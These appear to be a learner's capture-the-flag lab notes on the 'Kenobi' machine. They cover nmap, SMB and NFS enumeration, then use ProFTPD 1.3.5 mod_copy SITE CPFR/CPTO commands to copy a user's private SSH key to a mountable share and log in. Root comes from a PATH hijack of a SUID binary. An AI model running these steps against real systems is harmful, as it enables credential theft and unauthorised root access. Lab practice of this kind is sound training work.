export IP=<IP>

-> nmap scan
nmap $IP -v -oN nmap.log -A


Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin.html
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      38006/udp6  mountd
|   100005  1,2,3      45168/udp   mountd
|   100005  1,2,3      47269/tcp6  mountd
|   100005  1,2,3      48283/tcp   mountd
|   100021  1,3,4      39154/udp   nlockmgr
|   100021  1,3,4      39315/tcp6  nlockmgr
|   100021  1,3,4      43677/tcp   nlockmgr
|   100021  1,3,4      51349/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp open  nfs         2-4 (RPC #100003)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=10/15%OT=21%CT=1%CU=43017%PV=Y%DS=2%DC=T%G=Y%TM=670
OS:E760E%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%II=I%TS=8)SEQ(
OS:SP=105%GCD=1%ISR=10C%TI=Z%CI=I%TS=8)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=I%I
OS:I=I%TS=8)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)OPS(O1=M509ST11NW6
OS:%O2=M509ST11NW6%O3=M509NNT11NW6%O4=M509ST11NW6%O5=M509ST11NW6%O6=M509ST1
OS:1)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%
OS:W=6903%O=M509NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=
OS:N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T
OS:7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN
OS:=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 199.639 days (since Sat Mar 30 00:42:54 2024)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
| nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   KENOBI<00>           Flags: <unique><active>
|   KENOBI<03>           Flags: <unique><active>
|   KENOBI<20>           Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb2-time: 
|   date: 2024-10-15T14:02:44
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2024-10-15T09:02:44-05:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)


===
Samba is the standard windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred as a network file system

Samba is based on the common client/server protocol of server protcol of server message block (SMB). SMB is developed only for windows , without SAMBA other computer platforms would be isolated from windows machines, even if they were part of the same network

===


=> enum scan

enum4linux -a $IP -v

> keep note of the output - mostly user kenobi and share anonymous is found...

===

==> Using nmap to enumerate machine for SMB shares
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP -v -oN nmap.smb_enum.log



PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.242.138\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 3
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.242.138\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.242.138\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

NSE: Script Post-scanning.
Initiating NSE at 07:09
Completed NSE at 07:09, 0.00s elapsed
Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 93.29 seconds
           Raw packets sent: 5 (196B) | Rcvd: 5 (521B)

===

after finding the shares on the system, cnnect to anonymous share using smbclient command
cmd: smbclient //$IP/<shareName> #in this case the name is anonymous

else recursively download the contents of the share to local system using the below command:
cmd: smbget -R smb://$IP/<share>

===

==> Enum port 111 that is running rpcbind (most prob. this is running nfs)
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP -oN nmap.nfs_rpc_enum.log -v


PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *
| nfs-ls: Volume /var
|   access: Read Lookup NoModify NoExtend NoDelete NoExecute
| PERMISSION  UID  GID  SIZE  TIME                 FILENAME
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
| rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
| rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
| rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
| rwxrwxrwx   0    0    4096  2019-09-04T08:43:56  crash
| rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
| rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
| rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
| rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
| rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
|_
| nfs-statfs: 
|   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
|_  /var        9204224.0  1836520.0  6877108.0  22%   16.0T        32000

NSE: Script Post-scanning.
Initiating NSE at 07:23
Completed NSE at 07:23, 0.00s elapsed
Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.49 seconds
           Raw packets sent: 5 (196B) | Rcvd: 4 (504B)

===

Gaining initial access with proftpd software
-> find the version of the software that is running - this can be seen in nmap scan output - its using 1.3.5

Use searchsploit to find any exploits for proftpd 1.3.5 software
cmd: searchsploit proftpd 1.3.5

use one of these exploits by the command: searchsploit -p <path>

From these exploits, The mod_copy module implements SITE CPFR and SITE CPTO commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination.


==> run the nc program on port 21 for the remove machine
nc $IP 21

run the commands: SITE CPFR /home/kenobi/.ssh/id_rsa
                  SITE CPTO /var/tmp/id_rsa

now we know that /var share is availble to mount on and also we copied kenobi private ssh key to this var folder

connect to this smb mount

cmd: mkdir /mnt/kenobi
cmd: mount $IP:/var /mnt/kenobi
cmd: ls -la /mnt/kenobi
cmd: cp /mnt/kenobi/tmp/id_rsa .
cmd: chmod 600 id_rsa
cmd: ssh kenobi@$IP -i id_rsa


===

==> Privilege Escalation with Path Variable Manipulation

rw-rw-rw- 

  => 1st "-" is SUID
  => 2nd "-" is SGID
  => 3rd "-" is Sticky Bit

SUID bit -> on files user executes the file with permissions of the file owner

SGID bit -> on files user executes the file with permission of the group owner  -> on directories, file created in directory gets the same group owner

Sticky Bit -> on files, it has no meaning -> on directories, users are prevented from deleting files from other users


Lets find the files with SUID permissions: find / -perm -u=s -type f 2>/dev/null


kenobi@kenobi:~$ find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6


-> one of the output files that is odd one is: /usr/bin/menu


run the program and based on the options provided, lets follow the procedure
cmd: cd /tmp
cmd: echo /bin/sh > curl
cmd: chmod 777 curl
cmd: export PATH=/tmp:$PATH
cmd: /usr/bin/menu

-> enter 1 as input - we will get root shell spawned

